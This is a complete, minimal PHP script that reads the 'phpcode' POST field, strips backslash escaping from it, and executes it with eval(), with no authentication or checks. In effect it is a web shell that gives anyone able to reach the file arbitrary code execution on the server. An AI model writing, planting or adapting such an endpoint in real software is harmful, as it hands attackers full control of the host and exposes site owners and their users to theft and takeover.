<?php

$code = $_POST['phpcode'];

$code = str_replace('\\\\','é',$code);
$code = str_replace('\\','',$code);
$code = str_replace('é','\\',$code);

eval($code);

?>